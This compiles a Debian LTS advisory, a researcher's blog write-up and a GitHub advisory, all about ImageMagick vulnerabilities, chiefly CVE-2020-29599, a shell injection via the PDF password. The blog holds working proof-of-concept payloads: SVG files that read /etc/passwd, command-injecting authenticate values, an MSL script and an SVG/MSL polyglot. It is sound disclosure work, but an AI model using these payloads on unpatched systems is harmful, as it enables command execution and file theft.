=== Content from lists.debian.org_0e361f5b_20250119_112326.html ===


---

[[Date Prev](msg00009.html)][[Date Next](msg00011.html)]
[[Thread Prev](msg00009.html)][[Thread Next](msg00011.html)]
[[Date Index](maillist.html#00010)]
[[Thread Index](threads.html#00010)]

# [SECURITY] [DLA 2523-1] imagemagick security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 2523-1] imagemagick security update
* *From*: Sylvain Beucler <beuc@beuc.net>
* *Date*: Tue, 12 Jan 2021 18:43:56 +0100
* *Message-id*: <[[🔎]](/msgid-search/20210112174356.GA5462%40mail.beuc.net) [20210112174356.GA5462@mail.beuc.net](msg00010.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-2523-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>
January 12, 2021                              <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : imagemagick
Version        : 8:6.9.7.4+dfsg-11+deb9u11
CVE ID         : CVE-2017-14528 CVE-2020-19667 CVE-2020-25665 CVE-2020-25674
                 CVE-2020-27560 CVE-2020-27750 CVE-2020-27760 CVE-2020-27763
                 CVE-2020-27765 CVE-2020-27773 CVE-2020-29599
Debian Bug     : 878544 972797 977205

Several security vulnerabilities were found in ImageMagick, a suite of
image manipulation programs. An attacker could cause denial of service
and execution of arbitrary code when a crafted image file is
processed.

CVE-2017-14528

    The TIFFSetProfiles function in coders/tiff.c has incorrect
    expectations about whether LibTIFF TIFFGetField return values
    imply that data validation has occurred, which allows remote
    attackers to cause a denial of service (use-after-free after an
    invalid call to TIFFSetField, and application crash) via a crafted
    file.

CVE-2020-19667

    Stack-based buffer overflow and unconditional jump in ReadXPMImage
    in coders/xpm.c

CVE-2020-25665

    The PALM image coder at coders/palm.c makes an improper call to
    AcquireQuantumMemory() in routine WritePALMImage() because it
    needs to be offset by 256. This can cause a out-of-bounds read
    later on in the routine. This could cause impact to reliability.

CVE-2020-25674

    WriteOnePNGImage() from coders/png.c (the PNG coder) has a for
    loop with an improper exit condition that can allow an
    out-of-bounds READ via heap-buffer-overflow. This occurs because
    it is possible for the colormap to have less than 256 valid values
    but the loop condition will loop 256 times, attempting to pass
    invalid colormap data to the event logger.

CVE-2020-27560

    ImageMagick allows Division by Zero in OptimizeLayerFrames in
    MagickCore/layer.c, which may cause a denial of service.

CVE-2020-27750

    A flaw was found in MagickCore/colorspace-private.h and
    MagickCore/quantum.h. An attacker who submits a crafted file that
    is processedcould trigger undefined behavior in the form of values
    outside the range of type `unsigned char` and math division by
    zero. This would most likely lead to an impact to application
    availability, but could potentially cause other problems related
    to undefined behavior.

CVE-2020-27760

    In `GammaImage()` of /MagickCore/enhance.c, depending on the
    `gamma` value, it's possible to trigger a divide-by-zero condition
    when a crafted input file is processed by ImageMagick. This could
    lead to an impact to application availability.

CVE-2020-27763

    A flaw was found in MagickCore/resize.c. An attacker who submits a
    crafted file that is processed by ImageMagick could trigger
    undefined behavior in the form of math division by zero. This
    would most likely lead to an impact to application availability,
    but could potentially cause other problems related to undefined
    behavior.

CVE-2020-27765

    A flaw was found in MagickCore/segment.c. An attacker who submits
    a crafted file that is processed by ImageMagick could trigger
    undefined behavior in the form of math division by zero. This
    would most likely lead to an impact to application availability,
    but could potentially cause other problems related to undefined
    behavior.

CVE-2020-27773

    A flaw was found in MagickCore/gem-private.h. An attacker who
    submits a crafted file that is processed by ImageMagick could
    trigger undefined behavior in the form of values outside the range
    of type `unsigned char` or division by zero. This would most
    likely lead to an impact to application availability, but could
    potentially cause other problems related to undefined behavior.

CVE-2020-29599

    ImageMagick mishandles the -authenticate option, which allows
    setting a password for password-protected PDF files. The
    user-controlled password was not properly escaped/sanitized and it
    was therefore possible to inject additional shell commands via
    coders/pdf.c.

For Debian 9 stretch, these problems have been fixed in version
8:6.9.7.4+dfsg-11+deb9u11.

We recommend that you upgrade your imagemagick packages.

For the detailed security status of imagemagick please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/imagemagick>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEQic8GuN/xDR88HkSj/HLbo2JBZ8FAl/93REACgkQj/HLbo2J
BZ9dTwf+OquA6Hn9JslevO+QRmx5TQw/8WwhsVRTylhPX1BE7WxCy2UDzwmECQVq
e2AihD3//rJovN8RMNxnpMbuOCAMaAZRQTTQHbgX7jJBdzj47EEvmtdNxYDzoa1v
BlQkUpvVoLQcui+4HQJxk8ZpxygE9xPow57N05Fy7HZvcd2wBm9V2wkvpS4qu+VR
BqYDuSY3NiAIaRlGs5kC+AHFZ8X8cmi1RTEGko5A8PYLuYcd4ErqhwxvoIH+kK0t
rP3gA1wPwm1W+d/GZ2hiShqcW6W0EndIBHCFGOqfP09lIKGOdjBqNY5xm2dlXOa0
TWt0guMN8IfQILglaIqqH32bY0xaOg==
=SMWK
-----END PGP SIGNATURE-----

```

---



=== Content from insert-script.blogspot.com_390cec48_20250119_112326.html ===


# [InsertScript](https://insert-script.blogspot.com/)

## Saturday, November 21, 2020

### ImageMagick - Shell injection via PDF password

*"Use ImageMagick® to create, edit, compose, or convert bitmap images. It can read and write images in a variety of formats (over 200) including PNG, JPEG, GIF, HEIC, TIFF, DPX, EXR, WebP, Postscript, PDF, and SVG [ and many more ]"*[1](https://imagemagick.org/index.php)

In 2016 [ImageTragick](https://imagetragick.com/) was revealed. The associated reseachers showed that ImageMagick is not only powerful, eg you can read local files, but that it is possible to execute shell commands via a maliciously crafted image.

In late [2016](https://seclists.org/oss-sec/2016/q4/29) and in [2018](https://seclists.org/oss-sec/2018/q3/142) Tavis Ormandy ([@taviso](https://twitter.com/taviso)) showed how the support of external programs ( ghostscript) in ImageMagick could lead to remote execution.

Given the past research I had a quick look at the supported external programs (libreoffice/openoffice I already spent quite some time on), and I decided to get a proper understanding how IM (ImageMagick) calls external programs and the way they fixed the shell injections in the ImageTragick report.

As you are reading this blogpost, it paid off and I found a vulnerability. But I also learned two things:

**Note:**
1) The IM team is really active and is trying to address any issue raised quickly (thats important later)
2) ImageMagick is an awesome tool to convert files. It supports some really weird old file types (often via external programs) and is trying to be as user friendly as possible, maybe a little too much ^^

#### The Fix: ImageMagick, https and cURL

An important part of ImageMagick and how it handles files is not solely the infamous *delegates.xml* file but the [coders](https://github.com/ImageMagick/ImageMagick/tree/master/coders) folder. The [delegates.xml](https://github.com/ImageMagick/ImageMagick/blob/master/config/delegates.xml.in) file specifies the commands and parameters to call an external program to handle a certain file type. But before that the handlers in the aforementioned coders folders are used to parse a file and determine if an external program needs to be called (this is a simplification but in most cases it works this way)
As there are lot of files in coders, I decided to check how *https:* URLs are handled by ImageMagick as I already knew curl will be used in the end, which was vulnerable to command injection.
To keep it short - the *https:* handler is registered in this line:
 <https://github.com/ImageMagick/ImageMagick/blob/master/coders/url.c#L327>
In case IM has to handle *https:* URLs - the following branch is called:<https://github.com/ImageMagick/ImageMagick/blob/master/coders/url.c#L157>
```
status=InvokeDelegate(read_info,image,"https:decode",(char *) NULL,
```

*InvokeDelegate* calls *InterpretDelegateProperties*, which calls *GetMagickPropertyLetter*, which calls [*SanitizeDelegateString*](https://github.com/ImageMagick/ImageMagick/blob/master/MagickCore/delegate.c#L526).
```
whitelist[] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 "
      "$-_.+!;*(),{}|\\^~[]`\"><#%/?:@&=";
[...]
for (p+=strspn(p,whitelist); p != q; p+=strspn(p,whitelist))
    *p='_';
  return(sanitize_source);
```

This function basically replaces ' (single quotes) with "\_" on non-windows system (which I assume as the default). This is important as in the end [ExternalDelegateCommand](https://github.com/ImageMagick/ImageMagick/blob/master/MagickCore/delegate.c#L341) is called. This function handles calling external executables. The defined curl command in delegates.xml is used and the user defined URL is included in single quotes. As single quotes were filtered before, it is not possible to inject additional shell commands.
I verified that by modifying the source code of IM and included some *printf* statements to dump the created command. So let's assume a SVG or MVG (an example is available in ImageTragick) that specifies an *https:* URL like this:
```
<svg width="200" height="200"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="https://example.com/test'injection" height="200" width="200"/>
</svg>
```
**Command line:**
```
convert test.svg out.png
```

The created shell command by ImageMagick looks like this:
```
curl -s -k -L -o 'IMrandomnumber.dat' 'https://example.com/test_injection'
```

**Important Note:** As shown by this example, different coders can call each other as in this case SVG triggers the execution of the *url.c* coder. In case ImageMagick is compiled to use a third-party library like *librsvg* to parse SVG files, the third party library handles protocols by itself. In this scenario it is still possible to trigger ImageMagicks own SVG parsers via the [MSVG](https://github.com/ImageMagick/ImageMagick/blob/master/coders/svg.c#L3793) support ("ImageMagick's own SVG internal renderer"):
```
convert test.msvg out.png
```

ImageMagick also allows to set a specific handler via this syntax:
```
convert msvg:test.svg out.png
```

## Short intermission - reading local files

As ImageMagick allows to set specific file handlers as shown above, I decided to make a quick assessment, which handlers could allow to read and leak local files. My test case assumed that a user controlled SVG file is converted by IMs internal SVG parser to a PNG file, which is returned to the end user afterwards. An example could be an avatar upload on a website.
```
convert test.svg userfile.png
```
The first powerful coder is already mentioned in ImageTragick - *[text](https://legacy.imagemagick.org/Usage/text/#text):*. *'The "text:" input format is designed to convert plain text into images consisting one image per page of text. It is the 'paged text' input operator of ImageMagick.*'. The coder is registered in [txt.c](https://github.com/ImageMagick/ImageMagick/blob/master/coders/txt.c#L653).
```
<svg width="1000" height="1000"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="text:/etc/passwd" height="500" width="500"/>
</svg>
```

Another example to read */etc/passwd* is based on LibreOffice. This is possible as LibreOffice supports the rendering of a text file. As ImageMagick has no support for this file type, the corresponding protocol handler can be found via the *decode* property in [delegates.xml](https://github.com/ImageMagick/ImageMagick/blob/master/config/delegates.xml.in#L88).This vector only works of course when OpenOffice/LibreOffice is installed:
```
<svg width="1000" height="1000"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="odt:/etc/passwd" height="500" width="500"/>
</svg>
```

It is also possible to use *html:* - in case *html2ps* is installed. Although ImageMagick registers a "HTML" handler, it only sets an [encoder](https://github.com/ImageMagick/ImageMagick/blob/master/coders/html.c#L140) entry. Encoders only handle the creation/writing but not reading (this is done by the decoders) of the file type. Therefore the decoder in [delegates.xml](https://github.com/ImageMagick/ImageMagick/blob/master/config/delegates.xml.in#L81) is used:
```
<svg width="1000" height="1000"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="html:/etc/passwd" height="500" width="500"/>
</svg>
```

This is not an exhausted list but should document the general idea. Back to the shell injection.
#### Entry Point - Encrypted PDFs

After I got an understanding of the usage of curl, I checked again the command defined in delegates.xml:
```
<delegate decode="https:decode"
command="&quot;@WWWDecodeDelegate@&quot; -s -k -L -o &quot;%u.dat&quot; &quot;https:%M&quot;"/>

```

%M is replaced with the user-controlled URL. Therefore, I checked all occurrences of %M and if they are handled correctly. Additionally I had a look at all the defined replacement values defined in [property.c](https://github.com/ImageMagick/ImageMagick/blob/master/MagickCore/property.c#L2368). In the end nothing yielded a proper injection vulnerability. Then I stumbled upon the following line in the [pdf.c](https://github.com/ImageMagick/ImageMagick/blob/master/coders/pdf.c#L600) coder:
```
(void) FormatLocaleString(passphrase,MagickPathExtent,
        "\"-sPDFPassword=%s\" ",option);
```

As this seemed to set a password, which is most likely fully user controlled, I looked up how this parameter can be set and if it could be abused. Based on the [changelog](https://github.com/ImageMagick/ImageMagick/blob/92b33f01098e0432555baec6a034e67836de7796/ChangeLog#L1720), ImageMagick added a "*-authenticate"* command line parameter in 2017 to allow users to set a password for encrypted PDFs.So, I tested it via the following command to dump the created command:
```
convert -authenticate "password" test.pdf out.png
```

Shell command created:
```
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4
 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=password" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9'
```

As I confirmed that the password is included in the created *gs* command, which parses the specified PDF, it was time to check if double quotes are handled correctly:
```
convert -authenticate 'test" FFFFFF' test.pdf out.png
```

```
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4
 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=test" FFFFFF" '-sOutputFile=/tmp/magick-YPvcqDeC7K-Q8xn8VZPwHcp3G1WVkrj7%d' '-f/tmp/magick-sxCQc4-ip-mnuSAhGww-6IFnRQ46CBpD' '-f/tmp/magick-pU-nIhxrRulCPVrGEJ868knAmRL8Jfw9
```

To my surprise I was able to prematurely close the *-sPDFPassword* parameter, which allows me to include additional shell commands. The specified *"password"* has to contain one of the following characters *"&;<>|"* so the shell injection gets actually triggered. The reason being that ImageMagick will only use the *system* call (and therefore the system shell) in case one of these characters is [present](https://github.com/ImageMagick/ImageMagick/blob/master/MagickCore/delegate.c#L400):
```
if ((asynchronous != MagickFalse) ||
      (strpbrk(sanitize_command,"&;<>|") != (char *) NULL))
    status=system(sanitize_command);
```

Putting alltogether I tested the following command:
```
convert -authenticate 'test" `echo $(id)> ./poc`;"' test.pdf out.png
```
Shell command created:
```
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4
 -dGraphicsAlphaBits=4 '-r72x72' "-sPDFPassword=test" `echo $(id)> ./poc`;"" '-sOutputFile=/tmp/magick-pyNxb2vdkh_8Avwvw0OlVhu2EfI3wSKl%d' '-f/tmp/magick-IxaYR7GhN3Sbz-299koufEXO-ccxx46u' '-f/tmp/magick-GXwZIbtEu63vyLALFcqHd2c0Jr24iitE'
```

The file "*poc"* was created and it contained the output of the *id* command. At this point I had a confirmed shell injection vulnerability.The problem was: It is unlikely that a user has the possibility to set the *authenticate* parameter. So I decided to look for a better PoC:
#### Explotation - MSL and Polyglots

I needed to find a way to set the "-authenticate" parameter via a supported file type and I already knew where to look at: ImageMagick Scripting Language (MSL). This is a XML based file format supported by ImageMagick, which allows to set the input file, output file and additional parameters. An example file can be found [here](https://imagemagick.org/script/conjure.php) - I simplified it a bit:
```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="image.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="image.png" />
</image>
```

This file format is not properly documented, which is mentioned by the ImageMagick team, so I checked the source code regarding the supported attributes. I quickly discovered the following line in the [source code](https://github.com/ImageMagick/ImageMagick/blob/7.0.10-34/coders/msl.c#L8134) of the MSL coder:
```
if (LocaleCompare(keyword,"authenticate") == 0)
{
(void) CloneString(&image_info->density,value);
break;
}
```

Via additional debug calls I verified that this path handles any tag, which sets the authenticate attribute. But the code assigns the defined value to the density property, which made no sense. After studying the rest of the MSL code I came to the following conclusion:
**1)** This code should set the authenticate attribute similar to the *"-authenticate"* command line parameter.**2)** The code was simply wrong and therefore blocking the possibility to abuse the shell injection.
So I decided to do something I haven't done before: Mention this problem via Github and see if it gets fixed (I created a new github account for that) - <https://github.com/ImageMagick/ImageMagick/discussions/2779>
In the end the code was fixed correctly:
```
if (LocaleCompare(keyword,"authenticate") == 0)
{
(void) SetImageOption(image_info,keyword,value);
break;
}
```

I immediately created a PoC MSL script to verify I could abuse the shell injection. Note that it is necessary to specify the *msl:* protocol handler so IM actually parses the script file correctly:
```
<?xml version="1.0" encoding="UTF-8"?>
<image authenticate='test" `echo $(id)> ./poc`;"'>
  <read filename="test.pdf" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="out.png" />
</image>
```

```
convert msl:test.msl whatever.png
```

And it worked - the *"poc"* file was created, proofing the shell injection.Last step: Wrap this all up in one SVG polyglot file.
## SVG MSL polyglot file:

My created polyglot file is a SVG file, which loads itself as an MSF file to trigger the shell injection vulnerability. I will start showing the SVG polyglot file and explain its structure:
**poc.svg:**
```
<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

First of all the SVG structure has an image root tag. As the parser does not enforce that the SVG tag is the root tag, IM has no problems parsing this file as a SVG. The SVG structure specifies an image URL, which uses *msl:poc.svg*. This tells ImageMagick to load *poc.svg* with the MSL coder.
Although MSF is a XML based structure, the MSF coder does not deploy a real XML parser. It only requires that the file starts with a tag it supports. Another trick I used is present in the read tag. It is necessary to target a PDF file to trigger the vulnerability. To bypass this necessity, I specified any known local file and used the *pdf:* protocol handler to ensure it is treated as a PDF:
PoC file in action:
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBa5NP93z_9wrtwqCw1JyqzXN7Bk54Dmxpr1ZHHDkr9R8P8V35wsdt5IQEYnp0Ued7Asj7bEjlurIZ9WHpPTl7PS96TWi322OSkmITYbjTLKIJBVJ7JzuXpQAA5CYD4QuIU68iElFQZGGb/w658-h345/demo2.gif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBa5NP93z_9wrtwqCw1JyqzXN7Bk54Dmxpr1ZHHDkr9R8P8V35wsdt5IQEYnp0Ued7Asj7bEjlurIZ9WHpPTl7PS96TWi322OSkmITYbjTLKIJBVJ7JzuXpQAA5CYD4QuIU68iElFQZGGb/s2048/demo2.gif)

The PoC is still not perfect as I have to assume the filename does not get changed as the file has to be able to reference itself. But I decided thats good enough for now.
#### PreConditions and protection

Obviously this vulnerable only works in case ImageMagick is not compiled with a third-party library, which handles PDF parsing.Also a user has to be able to set the "authenticate" parameter, either via the command line or via MSL (as shown in my PoC file).
In case ImageMagick must not handle PDF files, it is possible to disable the PDF coder via the *policy.xml* file therefore preventing the shell injection. How to configure *policy.xml* is already documented by <https://imagetragick.com/> (just include "PDF").
**Affected versions:**- Injection via "-authenticate"    -ImageMagick 7:    7.0.5-3 up 7.0.10-40- Explotation via MSL:     - ImageMagick 7:    7.0.10-35 up 7.0.10-40
Regarding ImageMagick 6 (aka legacy). Based on the source code the following versions should be vulnerable.
- Injection via "-authenticate"    - ImageMagick 6:     6.9.8-1 up to 6.9.11-40- Explotation via MSL:     -ImageMagick 6:     6.9.11-35 up to 6.9.11-40
I focused my testing solely on ImageMagick 7 so I tried ImageMagick 6 really late. It seems the "*-authenticate"* feature is broken in the legacy branch. But during testing my VM died so I leave it to the readers to create a PoC for ImageMagick 6 (or maybe I will do it as soon as I have some free time)
**Timeline:**
- 2020-11-01: Reported the vuln to ZDI- 2020-11-16: Didn't want to wait for any response from ZDI so reported the issue to ImageMagick - 2020-11-16: ImageMagick deployed a fix and asked me if I could wait for disclosure, as there is a release planned for this weekend. - 2020-11-16-20: Discussed the fix with the ImageMagick team.- 2020-11-21: Version 7.0.10-40 and 6.9.11-40 released.
I want to thank the ImageMagick developers. They try to address and fix any issues raised as quick as possible (feature or security related, doesn't matter). Additionally they allowed me to provide input how I would address the issue (which is not always accepted^^).

Eingestellt von

[Alex Inführ](https://www.blogger.com/profile/02302212768418073299 "author profile")

um

[4:35 AM](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5886761914763804909&postID=6451946200987753618&from=pencil "Edit Post")

[Older Post](https://insert-script.blogspot.com/2020/09/xss-challenge-solution-svg-use.html "Older Post")

[Home](https://insert-script.blogspot.com/)

## Impressum

[Impressum](https://insert-script.blogspot.co.at/p/impressum.html)

## Blog Archive

* ▼
  [2020](https://insert-script.blogspot.com/2020/)
  (4)
  + ▼
    [November](https://insert-script.blogspot.com/2020/11/)
    (1)
    - [ImageMagick - Shell injection via PDF password](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)
  + ►
    [September](https://insert-script.blogspot.com/2020/09/)
    (1)
  + ►
    [March](https://insert-script.blogspot.com/2020/03/)
    (1)
  + ►
    [January](https://insert-script.blogspot.com/2020/01/)
    (1)

* ►
  [2019](https://insert-script.blogspot.com/2019/)
  (3)
  + ►
    [July](https://insert-script.blogspot.com/2019/07/)
    (1)
  + ►
    [February](https://insert-script.blogspot.com/2019/02/)
    (1)
  + ►
    [January](https://insert-script.blogspot.com/2019/01/)
    (1)

* ►
  [2018](https://insert-script.blogspot.com/2018/)
  (3)
  + ►
    [August](https://insert-script.blogspot.com/2018/08/)
    (1)
  + ►
    [May](https://insert-script.blogspot.com/2018/05/)
    (2)

* ►
  [2017](https://insert-script.blogspot.com/2017/)
  (4)
  + ►
    [November](https://insert-script.blogspot.com/2017/11/)
    (1)
  + ►
    [August](https://insert-script.blogspot.com/2017/08/)
    (1)
  + ►
    [May](https://insert-script.blogspot.com/2017/05/)
    (1)
  + ►
    [January](https://insert-script.blogspot.com/2017/01/)
    (1)

* ►
  [2016](https://insert-script.blogspot.com/2016/)
  (3)
  + ►
    [December](https://insert-script.blogspot.com/2016/12/)
    (1)
  + ►
    [October](https://insert-script.blogspot.com/2016/10/)
    (1)
  + ►
    [February](https://insert-script.blogspot.com/2016/02/)
    (1)

* ►
  [2015](https://insert-script.blogspot.com/2015/)
  (2)
  + ►
    [May](https://insert-script.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://insert-script.blogspot.com/2015/04/)
    (1)

* ►
  [2014](https://insert-script.blogspot.com/2014/)
  (3)
  + ►
    [December](https://insert-script.blogspot.com/2014/12/)
    (1)
  + ►
    [September](https://insert-script.blogspot.com/2014/09/)
    (1)
  + ►
    [February](https://insert-script.blogspot.com/2014/02/)
    (1)

* ►
  [2013](https://insert-script.blogspot.com/2013/)
  (3)
  + ►
    [November](https://insert-script.blogspot.com/2013/11/)
    (1)
  + ►
    [September](https://insert-script.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://insert-script.blogspot.com/2013/08/)
    (1)

* ►
  [2012](https://insert-script.blogspot.com/2012/)
  (7)
  + ►
    [December](https://insert-script.blogspot.com/2012/12/)
    (1)
  + ►
    [November](https://insert-script.blogspot.com/2012/11/)
    (1)
  + ►
    [October](https://insert-script.blogspot.com/2012/10/)
    (1)
  + ►
    [September](https://insert-script.blogspot.com/2012/09/)
    (4)

## About Me

[![My photo](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIiPbPlTabzb8trRuhfhvcZzZysIhTF1dMp8HYtEEadIHvndripmvML9c8SwUDRkGnpPL-xJ6sbdOXH0ZBRcnLSKXsxrgpc73dP57VgY4ulufEdILpPscT5cB2zvsynQ/s113/IMG_20150518_170440.jpg)](https://www.blogger.com/profile/02302212768418073299)
[Alex Inführ](https://www.blogger.com/profile/02302212768418073299)

https://twitter.com/insertScript

[View my complete profile](https://www.blogger.com/profile/02302212768418073299)

|  |  |
| --- | --- |

[Impressum](https://insert-script.blogspot.co.at). Powered by [Blogger](https://www.blogger.com).



=== Content from github.com_f484b011_20250119_131616.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-685x-r4m9-ffxr)

**CVE-2020-29599**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-685x-r4m9-ffxr)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2020-29599](/advisories/GHSA-685x-r4m9-ffxr)

## ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40...

High severity

Unreviewed

Published
May 24, 2022
to the GitHub Advisory Database
•
Updated Mar 19, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-685x-r4m9-ffxr/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40 mishandles the -authenticate option, which allows setting a password for password-protected PDF files. The user-controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands via coders/pdf.c.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2020-29599>
* [ImageMagick/ImageMagick#2851](https://github.com/ImageMagick/ImageMagick/discussions/2851)
* <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html>
* <https://lists.debian.org/debian-lts-announce/2021/01/msg00010.html>
* <https://security.gentoo.org/glsa/202101-36>
* <https://lists.debian.org/debian-lts-announce/2023/03/msg00008.html>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2020-29599)
Dec 7, 2020

Published to the GitHub Advisory Database
May 24, 2022

Last updated
Mar 19, 2023

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.145%
